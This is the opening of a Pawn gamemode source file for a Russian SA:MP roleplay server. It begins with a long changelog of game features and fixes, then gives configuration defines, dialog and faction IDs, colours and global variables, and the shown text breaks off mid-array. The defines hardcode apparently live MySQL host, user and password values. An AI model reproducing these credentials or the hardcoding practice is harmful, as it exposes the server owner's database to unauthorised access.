/*

Разработка модификации SA:MP для проекта OneReal-Rp.Ru

-------------------------------------------------------

Разработка Beta v0.4
1.) Удалена команды /clist;
2.) Удалена старая шахта;
3.) Удален PaintBall;
4.) Уделен завод;
5.) Удалена работа машиниста;
6.) Удалена система покупки очков;
7.) Удалены рекламные блоки по всему городу;
8.) Удалена фракция банк;
10.) Удалил весь транспорт в базе данных.

-------------------------------------------------------

Разработка Beta v0.5

1.) Исправлен баг с командой /hospital;
2.) Исправлена работа бульдозера;
3.) Исправлена авторизация/регистрация аккаунта;
4.) Исправлен баг с командой /veh;
5.) Исправлена баг с командой /changehouse;
6.) Исправлен баг с бизнесом (СТО);
7.) Исправлен баг с загрузкой аккаунта при входе на сервер;
8.) Исправлен баг с /cinfo в казино;
9.) Исправлен баг с банкоматами;
10.) Исправлена баг с мэрией.
11.) Исправлено казино, добавлены новые фишки;
12.) Исправлен баг с не сохранением домашнего авто (Тюнинг)
13.) Исправлено баг с бизнесом СТО
14.) Исправлен PayDay теперь снимает деньги за дом
15.) Исправлен баг со складами у банд
16.) Исправлен баг с sscanf а точнее с размером в таких команда как /a /o и остальные
17.) Исправлен баг с пикапами
18.) Фикс бага с созданием авто прямо в игре
19.) Фикс бага с арендой бизнеса не снимало деньги

-------------------------------------------------------

Разработка Beta v0.6

1.) Добавлен цвет армии;
2.) Добавлена команда /flip;
3.) В карьере добавлены 3Dtext со складами руды;
4.) Чтобы получить зарплату нужно отыграть 20 минут на сервере;
5.) Сделана новая система каптя *** банд
6.) Обновлена команда /veh добавлено 255 цветов;
7.) Доделаны команды /b /try;
8.) Добавлено команда /bag теперь вы можете сообщить о баге;
9.) Добавлена команда /skill игрок может показать свои навыки владениям оружием другому игроку.
10.) Зоне 51 добавлена возможность покупать металл на заводе; (TEST)
11.) Инструкторам добавлен государственный чат /gov
12.) Сделана новая респа + транспорт кней
13.) Сделана новая шахта + маппинг к ней
14.) Сделан военный билет (осталось сделать выдачу)
15.) Сделан новый маппинг зоны 51
16.) Через банкомат можно пополнить счет мобильного телефона
17.) Зоне 51 на карте помечена база, также если Armi завалит бандита в зоне то Armi(тому кто убил) дает 150$ в payday
18.) С банкоматов убрана комиссия.
19.) В моде 7 уровней админки;
20.) Переделан чат для игроков;
21.) Переписан anticheat;
22.) Переписана ферма;
23.) Медики могут лечить в больнице, командой /heal;
24.) Чтобы купить дом,бизнес нужно чтобы деньги были на руках
25.) Переписана система свадьбы.
26.) Оптимизация кода, сортировка команд
27.) Переделана регистрация и авторизация
28.) Переделаны команды
29.) Переписана система домов, осталось исправить healme
30.) Переписана система создание Банко мата
31.) Исправлен баг с матами на зоне 51 бандиты не могли брать маты
32.) Удален старый маппинг зоны 51 добавлен новый

-------------------------------------------------------

Разработка Beta v0.7

1.) переделан логотип
2.) Переделаны все тексдрайвы: SELECK Cancel > < UP DOwn
3.) У Пд убраны баллончики с краской.
4.) Переделаны все мафии
5.) Убраны пикапи с arrest у пд
6.) Обновил роботу такси
7.) Фикс бага с наручниками, чтобы арестовать игрока нужно быть в 8 метрах от него.
8.) Проверил автошколу багов нету.
9.) Убраны все елки
10.) Убрал с /mm донат
11.) Переделана команды veh теперь можно создать много транспорта
12.) Сделан маппинг для шахты
13.) сделан новый тексдрайв сайта
14.) Убраны все ненужные команды
15.) Команда /setmaterials заменена на /setsklad
16.) Подправлен выход при аресте игрока (Система готова 100%)
17.) Если у вас есть авто то вы можете купить себе другое. (Не было возможности купить другое)
18.) Обновлена команда /exchequer
19.) Обновлен /members
20.) Переписана команда /fstyle
21.) Поставлены новые автобусы по городу лс
22.) Обновлено /menu убрано статистика оружия
23.) При покупке дома теперь не будет давать мопед +200л бензина
24.) Теперь в моде 18 фракций, удалена new time

-------------------------------------------------------

Разработка Beta v0.8

1.) Сделал /gps.
2.) Сделал 1 место спавна ( раньше было 3 ).
3.) Исправлен баг с /fuel.
4.) Украсили команды мода ( не в курсе, Женек мутил ).
5.) Обновлен /members.
6.) Обновлен /pass.
7.) Багофикс.
8.) Сделал команду /aduty
9.) Настроил все команды, если не вышел на дежурство, они не работают ( рп отыгрывать :D ).
10.) Убрал запрос пароля /aduty ( проголосовало большинство ).
11.) Маппинг для дач.
12.) Убрана елочка у АШ.
13.) Настроен мапинг у зоны 51.
14.) Исправлен баг с матами на зоне 51.
15.) Исправлен баг с /c ( писало при повтроном вызове таксиста "Вы уже вызывали механика" ).
16.) Теперь если нет телефона, нельзя зайти в /mm - телефон.
17.) Убрал этот единственный варнинг, бесил не много.
18.) Убрана команда /iznas ( бред для школьников троллей )
19.) Готова система дач ( после открытия будет функционировать )
20.) Сделана аренда лодок ( функция будет работать после дач )
21.) Исправлены орфографические ошибки ( 40% )
22.) Исправлен баг в банке

-------------------------------------------------------

Разработка Beta v0.9

1.) /makeleader ( добавил скины )
2.) Сообщение загрузки при входе
3.) Убрал функцию добавления forward (пример добавления public Имя, теперь вот так onereal_function Имя)
4.) Система телефона исправлена
5.) Запрос пароля при входе для администраторов  ( убрана команда /aduty )
6.) Исправил /makeleader ( теперь дает сразу скин )
7.) Сделана команда /ao ( Дёня просил )
8.) Перенесена респа FBI
9.) Новый интерьер для FBI
10.) Исправлен крупнейший баг
11.) Вернул старый /makeleader
12.) Сделана команда /aduty ( теперь все заебись )

-------------------------------------------------------

Разработка v1.0 Release

1.) Сделал команду /sll ( посмотреть, что за нубы слились на терре )
2.) Сделал шахту в SF
3.) Сделал работу "Развозчик металлов" на заводе касс
4.) Сделал команду покупки металла для развозчиков металла ( /buymet )
5.) Сделал команду продажи металла для развозчиков металла ( /sellmet )
6.) Сделал работу "Сборщик оружия" на заводе касс
7.) Удалена старая система телефона
8.) Проверка на GM, /gm
9.) Убран сдидометр у бульдозера
10.) Убран 3д текст у банка
11.) Убран 3д текст у АШ
12.) 3d тексты на Заводе, Шахте.
13.) Команда /robzavod для банд ( воровать маты на заводе )
14.) Пикап с местом, где воровать маты на заводе
15.) Убрана команда /bag
16.) Добавил в gps работу шахтера
17.) Добавил в gps работу развозчика продуктов
18.) Добавил в gps работу сборщик оружия
19.) Добавил пикапы входа/выхода на завод
20.) Сделал команду /setnewjobs ( добавление руды,патронов,металла для новых работ )
21.) Исправлен баг с киком в 0.3х ( теперь все пакеты доходят )
22.) Новый интерьер для Grove St.
23.) Исправлен баг с /sms
24.) Добавлен маппинг для шахты, и для Касс, так же добавленны машины на Касс
25.) Исправлен баг с удваиванием текста на металовозах
26.) Убран 3д текст со счетом матов на fbi,lspd,army,sfpd
27.) Новый интерьер для Los Santos Vagos Gang
28.) /sms теперь по номеру

-------------------------------------------------------

Разработка v1.1

1.) Исправлен баг с матами на зоне 51.
2.) Теперь при одевании маски, цвет черный.
3.) Снятие денег со своих бизнесов.
4.) Новый интерьер Grove Street.
5.) Новый интерьер Vagos Gang.
6.) Новый интерьер Rifa Gang.
7.) Новый интерьер Aztec Gang.
8.) Новый интерьер Ballas Gang.
9.) Изменен цвет матовоза рифы на нужный.
10.) Убраны дома на районах банд, на местах входа в интерьер.
11.) Перенесена респа баллас.
12.) Исправлен баг на шахте.
13.) Поставил грузовики для Развозчика металлов.
14.) Зона 51 теперь бесплатно берет маты на заводе.
15.) Вывод денег с бизнеса идет теперь на руки, а не в банк.
16.) Солдату Зоны 51 дается 100$ за то, что возит маты. ( 1 рейс = 100$ )
17.) Переписана работа развозчик материалов, теперь все на диалогах, не каких команд. ( за 1 рейс дается 300$ )
18.) Убраны команды /buymet, /sellmet ( уже не акктуально )
19.) в /tp добавлен завод К.А.С.С.
20.) Пикапы на зоне 51 (просили, говорят каждый раз через ворота не удобно )
21.) За убийство человека, бандам и мафиям теперь розыск не дается.
22.) Добавлен пикап с оружием для мерии.
23.) Добавлена команда /setmats - выдача матов гос. фракциям.
24.) Исправлена недоработка с выходом на дежурство.
25.) Проверка на личку на Зоне 51 ( если матов 500, то еще раз не возьмешь )
26.) Простенькая работа Грузчика в Форт Карсоне. ( 30$ за ящик )
27.) Новая работа грузчиков добавлена в /gps
28.) Исправлен 2-ой баг с личкой на зоне 51 ( -_- бредятина )
29.) Исправлен баг с работой грузчиков в Форт Карсоне.
30.) Сделана выдача донат-рублей через таб ( Admin command )
31.) Закоментирован старый донат,идет разработка нового...
32.) Сделал новый донат ( v0.1 ) ( в будущем думаю буду улучшать )
33.) Добавлена возможность покупки VIP аккаунта в донат

-------------------------------------------------------

Разработка v1.2

1.) Сделана команда /getguns ( для банд, взять оружее со склада )
2.) В /setmat добавлены банды

-------------------------------------------------------

Что сделать:

1.) Маппинг для грузчиков Fort Carson

-------------------------------------------------------

Authors:   Ruslan_Smk,

Skype Ruslan_Smk:   shift-host

-------------------------------------------------------
*/
//Свободный пикап Pickup[24] Pickup[23] Pickup[25] Pickup[9] Pickup[20]  _ Case _ (D_ATM+11 D_ATM+9 D_ATM+14 D_ATM+13 D_NMENU+13 D_NMENU+14 D_ATM+10 D_JOB+112 D_ADDNED+5 D_ATM+2 D_JOB+113 D_ATM+3 D_ATM+4 D_ATM D_ATM+12 D_JOB+62 D_JOB+113)
#include <a_samp>
#include <sscanf2>
#include <a_mysql>
#include <zcmd>
#include <mxdate>
#include <mxINI>
#include <foreach>
#include <streamer>
#if defined MAX_PLAYERS
#undef MAX_PLAYERS
#define MAX_PLAYERS	 150 // КОЛ ВО СЛОТОВ НА СЕРВЕРЕ
#endif
AntiDeAMX(){
	new a[][] ={
		"Unarmed (Fist)",
		"Brass K"};
	#pragma unused a
	}
//                Настройка мода
#define Namemode 									"OneReal RP" // Название мода
#define Namesite 									"OneReal-Rp.Ru" // Название сайта, тут понятно
#define Namesitet 									"OneReal Rp" // Название волны в SA News, пример:  Радио "Namesitet"
#define Namesitetx 									"OneReal" // Тоже новостная лента, пример: Получатель "Namesitetx" News
#define Version 	                                "Russia" // 
#pragma tabsize 0
// BD локалка
#define MySQL_DEBUG         0
#define SQL_HOST    	"iota.optiklink.com:3306"
#define SQL_USER    	"u252141_sKozBoX7ng"
#define SQL_PASS    	"DGLEgMY@hEok@3IoKHYfLFwd"
#define SQL_DB      	"s252141_trggrt"
// BD хостинг
#if defined hosting
#undef SQL_HOST
#undef SQL_USER
#undef SQL_PASS
#undef SQL_DB
#define SQL_HOST    	"iota.optiklink.com:3306"
#define SQL_USER    	"u252141_sKozBoX7ng"
#define SQL_PASS    	"DGLEgMY@hEok@3IoKHYfLFwd"
#define SQL_DB      	"s252141_trggrt"
#endif
//==============================================================================
#define TABLE_ACCOUNT       "accounts"
#define TABLE_HOUSE 		"testhouse"
#define TABLE_DUCH		    "duch"
#define TABLE_BIZZ          "bizz"
#define TABLE_FRACTION      "fraction"
#define TABLE_ENTERS        "enters"
#define TABLE_MAYOR         "mayor"
#define TABLE_OTHER         "other"
#define TABLE_VEH           "vehicle"
#define TABLE_GANGZONE      "gangzone"
#define TABLE_MAFIA         "mafia"
#define TABLE_FARM         	"farms"
/////////////////////////CTO название запчасти = продуктов жрет/////////////////
#define CTO_PAINT         	100
#define CTO_HYDR           	1
#define CTO_NITRO           1
#define CTO_SPOILER      	4
#define CTO_BUMPERS         5
#define CTO_ROOF         	223
////////////////////////КОЛ.ВО ПАТРОНОВ ДЛЯ 1% СКИЛЛА///////////////////////////
#define Ammo_SDPISTOL 45
#define Ammo_DEAGLE 25
#define Ammo_SHOTGUN 20
#define Ammo_MP5 89
#define Ammo_AK47 100
#define Ammo_M4A1 130
//=====================[Упр Функции]============================================
#define f(%1, 		 										format(%1,sizeof(%1),
#define send(%0,%1) SendClientMessage(%0, -1, %1)
#define onereal_function:%0(%1) forward%0(%1); public%0(%1)
//------------------------------------------------------------------------------
#define YouDoNotHaveAtHome 							"У вас нету дома!"
#define PlayerDoNotHaveAtHome 						"У игрока нету дома!"
#define YouHaveAtHome 								"У вас уже есть дом!"
#define YouHaveAnyCar 								"У вас уже есть авто!"
#define YouCanNotAdminDuty                          "Сначала выйдите на дежурство!"
#define YouCanNotAdminDuty1                         "Вы уже выходили на дежурство!"
#define YouDoNotHaveAnyCar 							"У вас нету авто!"
#define YouDoNotHaveEnoughMoney 					"У вас не хватает денег!"
#define YouDoNotHaveEnoughMoneyBank 				"На вашем счету в банке не хватает денег!"
#define YouDoNotHaveEnoughMoneyBizz 				"На вашем счету в бизнесе не хватает денег!"
#define YouCanNot 									"Доступ запрещен!"
#define YouCanNotBank                               "Вы должны находиться у банкомата!"
#define TPLAYEROFFLINE 								"Игрок не в игре!"
#define TPLAYERNLOGGED 								"Игрок не ввел пароль!"
#define PlayerIsNotInCar 							"Вы должны находится в транспорте!"
#define PlayerIsNotInHome 							"Вы должны находится в вашем доме!"
#define PlayerIsNotAtCar 							"Вы должны находиться возле своего транспорта!"
#define CarHasNoFuel 								"В транспорте закончился бензин, необходима заправка!"
#define CarIsBroken 								"Машина поломана!"
#define TextArrest 									"Введите: /arrest"
#define NeedToStartEngine 							"Необходимо завести двигатель!"
#define PlayerHaveMuteTime 							"Администрация запретила вам писать в чат!"
#define PlayerCanSendEveryThreeSec 					"Не флуди!"
#define PlayerCanSendEveryThreeSecAdm 				"Посылать жалобу администрации можно раз в 60 секунд!"
#define PlayerCanSendEveryThreeSecAd 				"Посылать объявление можно раз в 60 секунд!"
#define PlayerNeedToLoggedForToPlay 				"Время на авторизацию ограничено, для выхода из игры введите: {ffffff}/q(uit)"
#define NotTruePassword 							"Вы несколько раз ввели ложный пароль, для выхода из игры введите: {ffffff}/q(uit)"
#define LoggedTimeOver 								"Время на авторизацию ограничено, для выхода из игры введите: {ffffff}/q(uit)"
#define PlayerNeedToChooseSkin 						"Пожалуйста, выберите скин вашешего будущего персонажа:"
#define NeedChooseSex 								"Пожалуйста, выберите пол вашего персонажа:"
#define PlayerNeedToEnterPass 						"Здравствуйте! Придумайте себе сложный пароль и введите его в окошко!"
#define PlayerLimiterMoreB 							"Ваш навык вождения повышен, используйте <CTRL> что бы отключить лимит скорости"
#define PlayerLimiterMoreM 							"Ваш навык вождения понижен, (введите /carskill для получения информации)"
#define PlayerLimiterMoreMFifty 					"Ваш навык вождения недостаточно высокий! (введите /carskill для получения информации)"
#define MinisterText 								"Члены организации в сети\nПринять игрока в организацию\nУволить игрока из организации\nИзменить ранг игрока организации"
//==============================================================================
#define MAX_SPEED 						150
#define PHONE_PRICE                     100
#define TODAY_NUMBER 					444333 // мобила Onereal News
#define NEWS_UNITED 					1
#define VEHICLE_NEWS_ONE 				488 // Транспорт news
#define VEHICLE_NEWS_TWO 				582 // транспорт news
#define WEAPON_RM 						1 // Оружие по умолчанию rm
#define WEAPON_LCN 						2 // Оружие по умолчанию lcn
#define WEAPON_YAKUZA 					8 // Оружие по умолчанию yakuza
#define WEAPON_NEWS 					43 // Оружие по умолчанию news
#define WEAPON_GAND 					5 // Оружие по умолчанию gand
#define WEAPON_POLICE 					41 // Оружие по умолчанию FBI
#define RANK_IN_MAYOR 					11 // Колв-о рангов в мэрии
#define MONEY_FOR_FIXCAR 				750 // Деньги за респаун транспорта
#define SOUND_BUY_CAR_RESPRAY 			1134
#define THFREE_SECOND_FLOOD 			2 // Анти флуд для  чатов /o, /me, /s, /b и т.д.
#define THFREE_SECOND_FLOOD_REP 		60 // Антифлуд для репорта
#define FETIN_SECONF_UPDATE 			15000 // Обновление public FuelCheck()
#define ONE_HUNDRED_MSECOND 			130 // Обновление public UpdateSpeedometr(playerid) и public BadEngine(playerid) (Спидометр)
#define ONE_SECOND_UPDATE 				1000 // Обновление пабликов в 1 секунду
#define FUEL_START_INCAR 				200 // Кол-во литров бензина, при старте сервера
#define MIN_SKILLS_PLAYER 				0 // Минимальный скилл навыка вождения
#define MAX_SKILLS_PLAYER 				1000 // Максимальный скилл навыка вождения
#define NORM_SKILLS_PLAYER 				500 // Средний скилл навыка вождения, разделяет возможность включать/отключать ограничитель
#define MNORM_SKILLS_PLAYER 			499 // Средний скилл - 1, для public AutoSkills(playerid)
#define BE_MIN_HLS 						0
#define BE_MAX_SPD_VAR 					60 // (60) Максимальная скорость при ограничитель
#define BE_MAX_SPD 						BE_MAX_SPD_VAR*0.007
//==============================================================================
#define D_NULL 			0 // Информационный диалог
#define D_REGISTER 		1 // Диалог регистрации
#define D_LOGIN 		2 // Диалог авторизации
#define D_ERRORPAS 		3 // Диалог неверного ввода пароля
#define D_SEX 			4 // Диалог выбора пола
#define D_MAINMENU 		5 // Диалог главного меню
#define D_COMMANDSERVER 6 // Диалог комманд сервера
#define D_UCPADMIN 		7 // Панель управления для админа
#define D_UCPADMIN2 	8 // Панель управления для админа
#define D_SKILLS 		9 // Навыки игрока
//#define D_ADMIN 		10
#define D_ADDNED 		11 // Добавление домов, бизнесов + 10
#define D_JOINHOUSE 	24
#define D_SELLHOUSE 	29 // Продажа дома
#define D_JOINCARS 		31 // Покупка трнаспортп
#define D_INVITEFRAC 	18
#define D_PICK 			20 // выборы
#define D_INFL 			37
#define D_GPS 			46
#define D_FARM          12000
#define D_WEATHER   	47
#define D_FRACMENU 		49
#define D_MFRAC 		57
#define D_ATM 			62
#define D_VMENU 		72
#define D_NMENU 		77
#define D_CASH 			93
#define D_LIC 			95
#define D_HOME 			101
#define D_HEAL 			105
#define D_JOB 			131
#define D_DONATE        200
#define D_CTO           8000
#define D_DACH         (8601)
#define D_ARENSD       (8605)
#define D_DOSTUPADM    (8606)
#define D_VEH          (8607)
//==============================================================================
#define J_BUS           1
#define J_TAXI          2
#define J_PRODUCT 		3
#define J_FUEL          4
#define J_MECHANIC      5
#define J_TRUCKER       6
//==============================================================================
#define F_MAYOR 		1
#define F_POLICE_LS 	2
#define F_POLICE_SF 	3
#define F_FBI 			4
#define F_HOSPITAL 		5
#define F_LIC 			6
#define F_GROVE         7
#define F_BALLAS        8
#define F_RIFA          9
#define F_AZTECAS       10
#define F_VAGOS         11
#define F_ARMY 			12
#define F_CASINO 		13
#define F_REDDRAGON 	14
#define F_LCN 			15
#define F_YAKUZA 		16
#define F_RM    		17
#define F_UNITEDNEWS 	18
//==============================================================================
#define COLOR_SEA 			0x00808000
#define COLOR_GRAD1 		0xB4B5B700
#define COLOR_GRAD2 		0xBFC0C200
#define COLOR_GRAD3 		0xCBCCCE00
#define COLOR_GRAD4 		0xD8D8D800
#define COLOR_GRAD5 		0xE3E3E300
#define COLOR_GRAD6 		0xF0F0F0FF
#define COLOR_GREY 			0xA8A900AA
#define COLOR_GREEN 		0x33AA33AA
#define COLOR_RED 			0xAA3333AA
#define COLOR_LIGHTYELLOW 	0xFFFF00AA
#define COLOR_LIGHTRED 		0xFF6347AA
#define COLOR_LIGHTRED2 	0xFF0000FF
#define COLOR_LIGHTBLUE 	0x33CCFFAA
#define COLOR_LIGHTGREEN 	0x9ACD32AA
#define COLOR_YELLOW 		0xFFFF00AA
#define COLOR_YELLOW2 		0xF5DEB3AA
#define COLOR_WHITE 		0xFFFFFFAA
#define COLOR_FADE1 		0xE6E6E6E6
#define COLOR_FADE2 		0xC8C8C8C8
#define COLOR_TOMATO 		0xFF6347AA
#define COLOR_FADE3 		0xAAAAAAAA
#define COLOR_FADE4 		0x8C8C8C8C
#define COLOR_BLUE 			0x33AAFFFF
#define COLOR_FADE5 		0x6E6E6E6E
#define COLOR_PURPLE 		0xC2A2DAAA
#define COLOR_DBLUE 		0x2641FEAA
#define COLOR_ALLDEPT 		0xFF8282AA
#define COLOR_NEWS 			0xFFA500AA
#define COLOR_OOC 			0xE0FFFFAA
#define COLOR_ORANGE 		0x60DF4AAA
#define TEAM_BLUE_COLOR 	0x8D8DFF00
#define COLOR_BLACK 		0x000000AA
#define COLOR_BOX   		0x00000050
#define COLOR_BBLUE 		0x20A9FFAA
#define COLOR_BORDER 		0x00000AA
#define COLOR_INDIGO 		0x4B00B0AA
#define TEAM_GROVE_COLOR 	0x00D900C8
#define TEAM_VAGOS_COLOR 	0xFFC801C8
#define TEAM_BALLAS_COLOR 	0xD900D3C8
#define TEAM_AZTECAS_COLOR 	0x01FCFFC8
#define COLOR_GRENNN  		0x3C67BCaa
#define COLOR_SYSTEM 		0xEFEFF7AA
#define COLOR_REDD 			0xFF0000AA
//==============================================================================
#define SetPlayerHoldingObject(%1,%2,%3,%4,%5,%6,%7,%8,%9) SetPlayerAttachedObject(%1,MAX_PLAYER_ATTACHED_OBJECTS-1,%2,%3,%4,%5,%6,%7,%8,%9)
#define StopPlayerHoldingObject(%1) RemovePlayerAttachedObject(%1,MAX_PLAYER_ATTACHED_OBJECTS-1)
#define IsPlayerHoldingObject(%1) IsPlayerAttachedObjectSlotUsed(%1,MAX_PLAYER_ATTACHED_OBJECTS-1)
#define SCM  SendClientMessage
#define BYTES_PER_CELL (cellbits / 8)
#define PRESSED(%0) (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
//==============================================================================
forward Stats(playerid, targetid);
forward UpdateSpeedometr(playerid);
forward AutoSkills(playerid);
forward AntiBH(playerid);
forward OnPlayerAmmoChange(playerid, newammo, oldammo);
forward ShowLogin(playerid);
forward FunctionsTimer(playerid,functi);
forward UpdateBeg(playerid);
forward KickTimer(playerid);
//==============================================================================
// Это массив с координатами "подбора" груза
new Float:checkLoader[4][3] = {
{-158.8091, 1167.8751, 19.7422},
{-148.1313, 1115.9945, 19.7500},
{-226.2327, 1070.9415, 19.7422},
{-43.4311, 1174.9413, 19.4627}
};
// А здесь координаты "разгрузки"
new Float:checkLoaderUnload[1][3] = {
{-110.6400, 1129.0634, 19.7422}
};
new hereCheckLoader[MAX_PLAYERS];
new hereCheckUnLoader[MAX_PLAYERS];
new drawer[MAX_PLAYERS];
//
new CP[MAX_PLAYERS];
new begi[MAX_PLAYERS];
new legi[MAX_PLAYERS];
new Text3D: patron3D;
new GmtestTimer[MAX_PLAYERS];
new Float:AdmGMHP[MAX_PLAYERS];
new AdmGM[MAX_PLAYERS] = 0;
new AdmGMID[MAX_PLAYERS];
new Float:AdmGMArm[MAX_PLAYERS];
new leg;
new vrag[MAX_PLAYERS];
new Text3D: vodzveh[5];
new Vzveh[MAX_VEHICLES];
new zveh[6];
new Patronbox;//ящики с патронами на заводе
new Metall; //Общак шахты
new Zavodz; //Общак завода(металл)
new bool:StatusFactory[28];
new Text3D:InFactory3DText[28];
new Objectbox[MAX_PLAYERS];
new Text3D: skladik;
new Text3D: skladik1;
new Text3D: skladik2;
new shahter;
new bool:animload[MAX_PLAYERS];
new Float:InFactory[][3] = {
	{147.5287,1854.3252,1001.0392},
	{147.5287,1856.7977,1001.0392},
	{147.5200,1859.2618,1001.0322},
	{147.5284,1861.7677,1001.0392},
	{150.7356,1861.8801,1001.0322},
	{150.7360,1859.4121,1001.0322},
	{150.7359,1856.8738,1001.0392},
	{150.7360,1854.4896,1001.0392},
	{153.6245,1854.4125,1001.0392},
	{153.6297,1856.8914,1001.0392},
	{153.6292,1859.3438,1001.0322},
	{153.6293,1861.8386,1001.0322},
	{153.6292,1864.3308,1001.0322},
	{153.6292,1866.8429,1001.0392},
	{156.8361,1867.0282,1001.0322},
	{156.8356,1864.5341,1001.0322},
	{156.8356,1861.9755,1001.0322},
	{156.8358,1859.5558,1001.0321},
	{156.8356,1857.0052,1001.0392},
	{156.8360,1854.4908,1001.0392},
	{159.1262,1854.4187,1001.0322},
	{159.1296,1856.8878,1001.0322},
	{159.1283,1859.4021,1001.0322},
	{159.1295,1861.8564,1001.0322},
	{162.4662,1861.9978,1001.0322},
	{162.4693,1859.4386,1001.0322},
	{162.4671,1857.0721,1001.0322},
	{162.4687,1854.5149,1001.0322}
};
new Text3D:FactorySFText3D[12];
new bool:StatusFactorySF[12];
new Float:InFactorySF[][3] = {
	{-2173.7324,-249.6370,36.5156},
	{-2177.7991,-249.6395,36.5156},
	{-2169.7109,-249.6385,36.5156},
	{-2165.6836,-249.6382,36.5156},
	{-2161.7209,-249.6443,36.5156},
	{-2157.7024,-249.6356,36.5156},
	{-2157.8101,-246.4291,36.5156},
	{-2161.8401,-246.4276,36.5156},
	{-2165.8159,-246.4286,36.5156},
	{-2169.8591,-246.4297,36.5156},
	{-2173.8489,-246.4290,36.5156},
	{-2177.8328,-246.4288,36.5156}
};
new Shaht[MAX_PLAYERS];
new Gruzik[MAX_PLAYERS];
new RudaNiz[MAX_PLAYERS];
new RudaSr[MAX_PLAYERS];
new RudaViz[MAX_PLAYERS];
new Samorodok[MAX_PLAYERS];
new rnizzp[MAX_PLAYERS];
new rsrzp[MAX_PLAYERS];
new rvizzp[MAX_PLAYERS];
new Ruda[MAX_PLAYERS];
new Zavod[MAX_PLAYERS];
new pMet[MAX_PLAYERS];
new kassenter;
new kassexit;
new razdelzav;
new razdelzveh;
new razdelshaht;
new razdelgruzika;
new shp[4];
new pObdelbox[MAX_PLAYERS];
new pBoxobdel[MAX_PLAYERS];
new Gotovbox[MAX_PLAYERS];
new pPatr[MAX_PLAYERS];
new Zavodzp[MAX_PLAYERS];
new ZPerevoz[MAX_PLAYERS];
//System jobs end
new vehiclek[MAX_PLAYERS],rendlodk[MAX_PLAYERS];
new const BE_Bad_Vehs[] = {
	460, 464, 476, 511, 512, 513, 519, 520, 539, 553, 577, 592, 593, // planes
	417, 425, 447, 465, 469, 487, 488, 497, 501, 548, 563 // heli
};
new bool: BE_Play_Check[MAX_PLAYERS];
new WEATHER[] = { 0, 1, 2, 3, 4, 5, 6, 7, 10 };
new RADIO[] = { 1, 2 };
new Float:VehiclePos[MAX_VEHICLES][3];
new bool:GameModeLoaded;
new PlayerInJob[MAX_PLAYERS]; // игрок работает сам по себе
new Meshki[MAX_PLAYERS]; // кол-во мешков
new Meshok[MAX_PLAYERS]; // фунци == 1 когда игрок несет мешок
new gryz1; // раздевалка грузчиков
new gryz2; // касса
new gryz3; // помощь
new Oldskin2[MAX_PLAYERS]; // сохраняет скин игрока
new AnimTimer[MAX_PLAYERS]; // таймер обновления анимации
new KustTimer[MAX_PLAYERS]; // таймер обновления анимации
new robmats[9];
new pDice[MAX_PLAYERS];
new vehinfo_id[15];
new cPickup[3];
new Pickup[34];
new PickupArends;
new Text3D:tPickup[33];
new Text3D:veh3dtext;
new narkoenter[2];
new reddragonpickup[2];
new mechanic[2];
new nouncar[2];
new taxicar[2];
new buscar[2];
new pogruz[2];
new fuelcar[2];
new faggio[2];
new banklv[2];
new rentcar[2];
new jobproduct[2];
new Object[9];
new Army[1];
new rotating[2];
new pickupentered[MAX_PLAYERS] = 0;
new grarm1car[2];
new Text3D:VehJZ[MAX_VEHICLES];
new Bolnica[2];
new fbipic[6];
new grovpic[2];
new vagospic[2];
new rifapic[2];
new azpic[2];
new balpic[2];
new arpic[2];
new TaxiCallTime[MAX_PLAYERS];
new MechCallTime[MAX_PLAYERS];
new Mission[MAX_PLAYERS];
new Missions[MAX_PLAYERS];
new MedicCallTime[MAX_PLAYERS];
new MedicCall = -1;
new MechCall = -1;
new TaxiCall = -1;
new Jelez[MAX_VEHICLES];
new FuelBank;
new narkopikup;
new sportpickup;
new pSportZal[MAX_PLAYERS];
new MafiaMetal[6];
new MafiaFuelTime[5];
new PlayerName[MAX_PLAYERS][MAX_PLAYER_NAME];
new Zac,FrakCD,Napad;
new Text:CaptTime[MAX_PLAYERS];
new Text:BandaCapt1a[MAX_PLAYERS];
new Text:BandaCapt2a[MAX_PLAYERS];
new Text:ScoreCapt1a[MAX_PLAYERS];
new Text:ScoreCaptTire[MAX_PLAYERS];
new Text:ScoreCapt2a[MAX_PLAYERS];
new Text:ScoreCapt[MAX_PLAYERS];
new Text:Textdraw4[MAX_PLAYERS];
new IsCapture;
#define MAX_GANGS 20
enum Ganginfa
{
	capture,
	score,
	captureid,
	gangnumber
}
new GangInfo[MAX_GANGS][Ganginfa];
#define MAX_SLIV 20
enum slinfo
{
	pName[MAX_PLAYER_NAME]
};
new SlivInfo[MAX_SLIV][20][slinfo];
new TOTALSL[20];
new Metal;
new Mats[20];
new Mineral[2];
new MafiaMineral[3];
new setname = -1;
new NounObject[20];
new RuletVidachaDen[MAX_PLAYERS];
new RuletikProv[MAX_PLAYERS];
new AdvertTime, AdvertTime_;
new Exchequer, Tax,TaxFractions[90],TaxFraction[7],InflationTime, Inflation,PickNames[256],PickName[7][32],PickDate,PickTimes[128],PickTime[7];
new NewsPrice[40],CallPrice[2], SmsPrice[2], AdvertPrice[2];
new SmsNews[2];
new CallNews[2];
new TOTALPRIZ, TOTALBLIST[4], TOTALGZ, TOTALPRODUCT, TOTALFUEL, TOTALFARM, TOTALBIZZ, TOTALADVERT[2], TOTALVEH, TOTALHOUSE, TOTALENTERS, TOTALFRAC,TOTALDUCH;
new bool:realchat = true;
new noooc = 1;
new engine,lights,alarm,doors,bonnet,boot,objective;
new ghour,gminute,gsecond;
new years, months, days,UBDay, UBHour, UBMin, UBSec, UBMSec;
new bool:Pick = false;
new query[2048],var[32],coordh[90],coordc[90],coordv[90],boordh[256];
new totalstring[1024]; // 1024
new Text3D:MatsText[MAX_VEHICLES];
new MatsPickup[MAX_VEHICLES];
new bool:Robbery[MAX_VEHICLES];
new bool:MatsStatus[MAX_VEHICLES];
new ProductKG[MAX_VEHICLES];
new LoadProductKG[MAX_VEHICLES];
new GunKG[MAX_VEHICLES];
new Pickup_Mech[MAX_VEHICLES];
new bool:Boot[MAX_VEHICLES];
new bool:Engine[MAX_VEHICLES];
new bool:Lights[MAX_VEHICLES];
new bool:Bonnet[MAX_VEHICLES];
new bool:IsLocked[MAX_VEHICLES];
new Fuel[MAX_VEHICLES] = 200;
new materials_Vehicle[MAX_PLAYERS];
new bool:PlayerFuelMes[MAX_VEHICLES];
new legalmods[48][22] = {
	{400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
